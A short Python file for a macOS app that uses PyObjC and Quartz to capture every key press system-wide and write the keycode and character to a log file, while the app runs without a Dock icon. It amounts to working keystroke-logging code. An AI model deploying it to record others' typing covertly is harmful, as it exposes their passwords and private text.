from app import utils, key_capture
from AppKit import NSApplication, NSApplicationActivationPolicyAccessory
from PyObjCTools import AppHelper
from AppKit import NSEvent
from Quartz import CGEventGetIntegerValueField, kCGKeyboardEventKeycode, kCGEventKeyDown


class App():
    def __init__(self):
        self.utils = utils.Utils(self)
        self.key_capture = key_capture.KeyCapture(self)


    def key_callback(self, proxy, event_type, event, refcon):
        if event_type == kCGEventKeyDown:
            keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)
            ns_event = NSEvent.eventWithCGEvent_(event)
            if ns_event:
                key_str = repr(ns_event.characters())
                log_obj = { "keycode": keycode, "key_str": key_str }
                self.utils.write_to_log_file(str(log_obj))
        return event


    def run(self):
        try:
            #config = self.utils.config
            self.key_capture.capture(self.key_callback)
            nsapp = NSApplication.sharedApplication()
            nsapp.setActivationPolicy_(NSApplicationActivationPolicyAccessory)
            AppHelper.runConsoleEventLoop()
        except Exception as e:
            #TODO:stop captures on exception
            raise e
